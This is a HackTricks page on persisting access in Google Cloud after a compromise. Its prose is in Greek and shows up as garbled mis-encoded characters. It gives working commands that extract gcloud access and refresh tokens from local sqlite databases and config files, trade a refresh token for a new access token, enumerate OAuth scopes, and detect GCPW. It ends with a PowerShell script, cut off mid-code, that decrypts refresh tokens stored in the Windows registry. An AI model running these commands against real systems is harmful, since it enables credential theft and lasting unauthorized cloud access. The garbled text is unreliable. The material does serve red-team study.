# GCP - Non-svc Persistance

{% hint style="success" %}


paLearn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

Î‘Ï…Ï„Î­Ï‚ ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼ÎµÏ‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Î¼ÏŒÎ»Î¹Ï‚, Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î¿ Ï„ÏÏŒÏ€Î¿, Î­Ï‡ÎµÏ„Îµ Ï€Î±ÏÎ±Î²Î¹Î¬ÏƒÎµÎ¹ ÎºÎ¬Ï€Î¿Î¹Î± GCP Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î® Î¼Î·Ï‡Î±Î½Î® Ï€Î¿Ï… ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÎµ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ GCP.

## Token Hijacking

### Authenticated User Tokens

Î“Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¿ **Ï„ÏÎ­Ï‡Î¿Î½ token** ÎµÎ½ÏŒÏ‚ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/access_tokens.db "select access_token from access_tokens where account_id='<email>';"
```
{% endcode %}

Î”ÎµÎ¯Ï„Îµ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· ÏƒÎµÎ»Î¯Î´Î± Ï€ÏÏ‚ Î½Î± **Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï€ÎµÏ…Î¸ÎµÎ¯Î±Ï‚ Î±Ï…Ï„ÏŒ Ï„Î¿ token Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ gcloud**:

{% embed url="https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf#id-6440-1" %}

Î“Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï„Î¹Ï‚ Î»ÎµÏ€Ï„Î¿Î¼Î­ÏÎµÎ¹ÎµÏ‚ Î³Î¹Î± **Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î½Î­Î¿ access token** ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ:

{% code overflow="wrap" %}
```bash
sqlite3 $HOME/.config/gcloud/credentials.db "select value from credentials where account_id='<email>';"
```
{% endcode %}

Î•Î¯Î½Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î²ÏÎµÎ¯Ï„Îµ refresh tokens ÏƒÏ„Î¿ **`$HOME/.config/gcloud/application_default_credentials.json`** ÎºÎ±Î¹ ÏƒÏ„Î¿ **`$HOME/.config/gcloud/legacy_credentials/*/adc.json`**.

Î“Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î½Î­Î¿ Î±Î½Î±Î½ÎµÏ‰Î¼Î­Î½Î¿ access token Î¼Îµ Ï„Î¿ **refresh token**, Ï„Î¿ client ID ÎºÎ±Î¹ Ï„Î¿ client secret, ÎµÎºÏ„ÎµÎ»Î­ÏƒÏ„Îµ:

{% code overflow="wrap" %}
```bash
curl -s --data client_id=<client_id> --data client_secret=<client_secret> --data grant_type=refresh_token --data refresh_token=<refresh_token> --data scope="https://www.googleapis.com/auth/cloud-platform https://www.googleapis.com/auth/accounts.reauth" https://www.googleapis.com/oauth2/v4/token
```
{% endcode %}

Î— Î´Î¹Î¬ÏÎºÎµÎ¹Î± Î¹ÏƒÏ‡ÏÎ¿Ï‚ Ï„Ï‰Î½ refresh tokens Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„ÎµÎ¯ ÏƒÏ„Î¿ **Admin** > **Security** > **Google Cloud session control**, ÎºÎ±Î¹ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® ÎµÎ¯Î½Î±Î¹ 16 ÏÏÎµÏ‚ Î±Î½ ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏÏ…Î¸Î¼Î¹ÏƒÏ„ÎµÎ¯ Î½Î± Î¼Î·Î½ Î»Î®Î¾ÎµÎ¹ Ï€Î¿Ï„Î­:

<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

### Auth flow

Î— ÏÎ¿Î® Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ ÏŒÏ„Î±Î½ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ ÎºÎ¬Ï„Î¹ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ `gcloud auth login` Î¸Î± Î±Î½Î¿Î¯Î¾ÎµÎ¹ Î­Î½Î± Ï€Î±ÏÎ¬Î¸Ï…ÏÎ¿ ÏƒÏ„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Ï€ÎµÏÎ¹Î®Î³Î·ÏƒÎ·Ï‚ ÎºÎ±Î¹ Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î±Ï€Î¿Î´Î¿Ï‡Î® ÏŒÎ»Ï‰Î½ Ï„Ï‰Î½ scopes, Ï„Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Ï€ÎµÏÎ¹Î®Î³Î·ÏƒÎ·Ï‚ Î¸Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„ÏŒ ÏƒÏ„Î·Î½ Î±Î½Î¿Î¹Ï‡Ï„Î® Î¸ÏÏÎ± http Î±Ï€ÏŒ Ï„Î¿ ÎµÏÎ³Î±Î»ÎµÎ¯Î¿:
```
/?state=EN5AK1GxwrEKgKog9ANBm0qDwWByYO&code=4/0AeaYSHCllDzZCAt2IlNWjMHqr4XKOuNuhOL-TM541gv-F6WOUsbwXiUgMYvo4Fg0NGzV9A&scope=email%20openid%20https://www.googleapis.com/auth/userinfo.email%20https://www.googleapis.com/auth/cloud-platform%20https://www.googleapis.com/auth/appengine.admin%20https://www.googleapis.com/auth/sqlservice.login%20https://www.googleapis.com/auth/compute%20https://www.googleapis.com/auth/accounts.reauth&authuser=0&prompt=consent HTTP/1.1
```
Î¤ÏŒÏ„Îµ, Ï„Î¿ gcloud Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎºÎ±Î¹ Ï„Î¿Î½ ÎºÏÎ´Î¹ÎºÎ± Î¼Îµ Î­Î½Î± ÏƒÎºÎ»Î·ÏÎ¬ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿ `client_id` (`32555940559.apps.googleusercontent.com`) ÎºÎ±Î¹ **`client_secret`** (`ZmssLNjJy2998hD4CTg2ejr2`) Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï„Î± **Ï„ÎµÎ»Î¹ÎºÎ¬ Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î±Î½Î±Î½Î­Ï‰ÏƒÎ·Ï‚ ÎºÏ‰Î´Î¹ÎºÎ¿Ï**.

{% hint style="danger" %}
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î· ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î± Î¼Îµ Ï„Î¿ localhost ÎµÎ¯Î½Î±Î¹ ÏƒÎµ HTTP, Î¿Ï€ÏŒÏ„Îµ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Ï€Î±ÏÎµÎ¼Î²Î»Î·Î¸Î¿ÏÎ½ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î·Î¸ÎµÎ¯ Î­Î½Î± refresh token, Ï‰ÏƒÏ„ÏŒÏƒÎ¿ Î±Ï…Ï„Î¬ Ï„Î± Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÎµÎ¯Î½Î±Î¹ Î­Î³ÎºÏ…ÏÎ± Î¼ÏŒÎ½Î¿ 1 Ï†Î¿ÏÎ¬, Î¿Ï€ÏŒÏ„Îµ Î±Ï…Ï„ÏŒ Î¸Î± Î®Ï„Î±Î½ Î¬Ï‡ÏÎ·ÏƒÏ„Î¿, ÎµÎ¯Î½Î±Î¹ Ï€Î¹Î¿ ÎµÏÎºÎ¿Î»Î¿ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ refresh token Î±Ï€ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿.
{% endhint %}

### OAuth Scopes

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÏŒÎ»Î¿Ï…Ï‚ Ï„Î¿Ï…Ï‚ Google scopes ÏƒÏ„Î¿ [https://developers.google.com/identity/protocols/oauth2/scopes](https://developers.google.com/identity/protocols/oauth2/scopes) Î® Î½Î± Ï„Î¿Ï…Ï‚ Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ ÎµÎºÏ„ÎµÎ»ÏÎ½Ï„Î±Ï‚:

{% code overflow="wrap" %}
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-A/\-\._]*' | sort -u
```
{% endcode %}

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï€Î¿Î¹ÎµÏ‚ Ï€ÎµÏÎ¹Î¿Ï‡Î­Ï‚ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ **`gcloud`** Î³Î¹Î± Ï„Î·Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏƒÎµÎ½Î¬ÏÎ¹Î¿:
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope         \r"
if ! curl -v "https://accounts.google.com/o/oauth2/auth?response_type=code&client_id=32555940559.apps.googleusercontent.com&redirect_uri=http%3A%2F%2Flocalhost%3A8085%2F&scope=openid+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fuserinfo.email+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcloud-platform+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fappengine.admin+$scope+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fsqlservice.login+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fcompute+https%3A%2F%2Fwww.googleapis.com%2Fauth%2Faccounts.reauth&state=AjvFqBW5XNIw3VADagy5pvUSPraLQu&access_type=offline&code_challenge=IOk5F08WLn5xYPGRAHP9CTGHbLFDUElsP551ni2leN4&code_challenge_method=S256" 2>&1 | grep -q "error"; then
echo ""
echo $scope
fi
done
```
ÎœÎµÏ„Î¬ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Ï„Î¿Ï…, ÎµÎ»Î­Î³Ï‡Î¸Î·ÎºÎµ ÏŒÏ„Î¹ Î±Ï…Ï„Î® Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï€ÎµÏÎ¹Î¿Ï‡Î­Ï‚:
```
https://www.googleapis.com/auth/appengine.admin
https://www.googleapis.com/auth/bigquery
https://www.googleapis.com/auth/cloud-platform
https://www.googleapis.com/auth/compute
https://www.googleapis.com/auth/devstorage.full_control
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/userinfo.email
```
ÎµÎ¯Î½Î±Î¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ Î½Î± Î´Î¿ÏÎ¼Îµ Ï€ÏÏ‚ Î±Ï…Ï„Î® Î· ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï„Î¿ **`drive`** scope, Ï„Î¿ Î¿Ï€Î¿Î¯Î¿ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÎµ Î­Î½Î±Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÎ¹ Î±Ï€ÏŒ Ï„Î¿ GCP ÏƒÏ„Î¿ Workspace Î±Î½ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎºÎ±Ï„Î±Ï†Î­ÏÎµÎ¹ Î½Î± Î±Î½Î±Î³ÎºÎ¬ÏƒÎµÎ¹ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± token Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ scope.

**Î”ÎµÎ¯Ï„Îµ Ï€ÏÏ‚ Î½Î±** [**ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Î±Ï…Ï„ÏŒ ÎµÎ´Ï**](../gcp-to-workspace-pivoting/#abusing-gcloud)**.**

### Î›Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Î¯ Î¥Ï€Î·ÏÎµÏƒÎ¹ÏÎ½

Î‘ÎºÏÎ¹Î²ÏÏ‚ ÏŒÏ€Ï‰Ï‚ Î¼Îµ Ï„Î¿Ï…Ï‚ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¹Î·Î¼Î­Î½Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚, Î±Î½ ÎºÎ±Ï„Î±Ï†Î­ÏÎµÏ„Îµ Î½Î± **ÏƒÏ…Î¼Î²Î¹Î²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ Î±ÏÏ‡ÎµÎ¯Î¿ ÎºÎ»ÎµÎ¹Î´Î¹Î¿Ï** ÎµÎ½ÏŒÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î±Ï…Ï„ÏŒ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ ÏŒÏƒÎ¿ Î¸Î­Î»ÎµÏ„Îµ**.\
Î©ÏƒÏ„ÏŒÏƒÎ¿, Î±Î½ ÎºÎ»Î­ÏˆÎµÏ„Îµ Ï„Î¿ **OAuth token** ÎµÎ½ÏŒÏ‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Î±Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î±ÎºÏŒÎ¼Î· Ï€Î¹Î¿ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½, ÎµÏ€ÎµÎ¹Î´Î®, Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î±Î½ Î±Ï€ÏŒ Ï€ÏÎ¿ÎµÏ€Î¹Î»Î¿Î³Î® Î±Ï…Ï„Î¬ Ï„Î± tokens ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î± Î¼ÏŒÎ½Î¿ Î³Î¹Î± Î¼Î¯Î± ÏÏÎ±, Î±Î½ Î¿ **Î¸ÏÎ¼Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎµÎ¹ Ï„Î¿ Î¹Î´Î¹Ï‰Ï„Î¹ÎºÏŒ api key, Ï„Î¿ OAuh token Î¸Î± Ï€Î±ÏÎ±Î¼ÎµÎ¯Î½ÎµÎ¹ Î­Î³ÎºÏ…ÏÎ¿ Î¼Î­Ï‡ÏÎ¹ Î½Î± Î»Î®Î¾ÎµÎ¹**.

### ÎœÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Î±

Î ÏÎ¿Ï†Î±Î½ÏÏ‚, ÏŒÏƒÎ¿ Î²ÏÎ¯ÏƒÎºÎµÏƒÏ„Îµ Î¼Î­ÏƒÎ± ÏƒÎµ Î¼Î¹Î± Î¼Î·Ï‡Î±Î½Î® Ï€Î¿Ï… Ï„ÏÎ­Ï‡ÎµÎ¹ ÏƒÏ„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ GCP Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± **Î­Ï‡ÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ Ï…Ï€Î·ÏÎµÏƒÎ¯Î±Ï‚ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î´ÎµÎ´ÎµÎ¼Î­Î½Î¿Ï‚ ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· Î¼Î·Ï‡Î±Î½Î® ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½ÏÎ½Ï„Î±Ï‚ Î¼Îµ Ï„Î¿ endpoint Î¼ÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½** (ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î± Oauth tokens Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï„Î¿ endpoint ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î± Î±Ï€ÏŒ scopes).

### Î‘Ï€Î¿ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚

ÎŸÏÎ¹ÏƒÎ¼Î­Î½ÎµÏ‚ Î±Ï€Î¿ÎºÎ±Ï„Î±ÏƒÏ„Î¬ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ ÎµÎ¾Î·Î³Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿ [https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2](https://www.netskope.com/blog/gcp-oauth-token-hijacking-in-google-cloud-part-2)

## GCPW - Google Credential Provider for Windows

Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï„Î¿ single sign-on Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Ï„Î¿ Google Workspaces ÏÏƒÏ„Îµ Î¿Î¹ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î½Î± Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î¿Ï…Ï‚ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î­Ï‚ Windows Ï„Î¿Ï…Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Ï„Î¿Ï… Workspace Ï„Î¿Ï…Ï‚**. Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î±Ï…Ï„ÏŒ Î¸Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÏƒÎµÎ¹ tokens Î³Î¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Google Workspace ÏƒÎµ ÎºÎ¬Ï€Î¿Î¹Î¿ Î¼Î­ÏÎ¿Ï‚ ÏƒÏ„Î¿Î½ Ï…Ï€Î¿Î»Î¿Î³Î¹ÏƒÏ„Î®.

Î•Î¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± ÎµÎ»Î­Î³Î¾ÎµÏ„Îµ Î±Î½ Ï„Î¿ GCPW ÎµÎ¯Î½Î±Î¹ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î¿ ÏƒÎµ Î¼Î¹Î± ÏƒÏ…ÏƒÎºÎµÏ…Î® ÎµÎ»Î­Î³Ï‡Î¿Î½Ï„Î±Ï‚ Î±Î½ Î· Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î® Î±Î½ Î¿Î¹ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎºÎ»ÎµÎ¹Î´Î¹Î¬ Î¼Î·Ï„ÏÏÎ¿Ï… Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
Î£Ï„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒÏ„Î·Ï„Î±, ÏƒÏ„Î¿ **`HKLM:\SOFTWARE\Google\GCPW\Users`** ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î± **domains** Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÏ„Î±Î¹ Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸Î¿ÏÎ½ ÏƒÏ„Î¿ ÎºÎ»ÎµÎ¹Î´Î¯ `domains_allowed` ÎºÎ±Î¹ ÏƒÎµ Ï…Ï€Î¿ÎºÎ»ÎµÎ¹Î´Î¹Î¬ ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· ÏŒÏ€Ï‰Ï‚ email, ÎµÎ¹ÎºÏŒÎ½Î±, ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·, Î´Î¹Î¬ÏÎºÎµÎ¹Î± Î¶Ï‰Î®Ï‚ token...

ÎšÎ±Î¹ ÏƒÏ„Î¿ **`HKCU:\SOFTWARE\Google\Accounts`** ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ email Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î· ÎºÎ±Î¹ ÏƒÏ„Î¿ ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿ **refresh token** Î±Î½ Î¿ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î­Ï‡ÎµÎ¹ ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ Ï€ÏÏŒÏƒÏ†Î±Ï„Î±.

### GCPW - Tokens Î‘Î½Î±Î½ÎµÏÏƒÎµÏ‰Î½ ÎœÎ·Ï„ÏÏÎ¿Ï…

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿ Î¼Î·Ï„ÏÏÎ¿ **`HKCU:\SOFTWARE\Google\Accounts`** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒÎ½ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÎºÎ¬Ï€Î¿Î¹Î¿Ï…Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚ Î¼Îµ Ï„Î¿ **`refresh_token`** ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î·Î¼Î­Î½Î¿ Î¼Î­ÏƒÎ±. Î— Î¼Î­Î¸Î¿Î´Î¿Ï‚ **`ProtectedData.Unprotect`** Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏÎºÎ¿Î»Î± Î½Î± Ï„Î¿ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÎµÎ¹.

<details>

<summary>Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> Î´ÎµÎ´Î¿Î¼Î­Î½Î± ÎºÎ±Î¹ Î±Ï€Î¿ÎºÏÏ…Ï€Ï„Î¿Î³ÏÎ±Ï†Î®ÏƒÏ„Îµ Ï„Î± refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
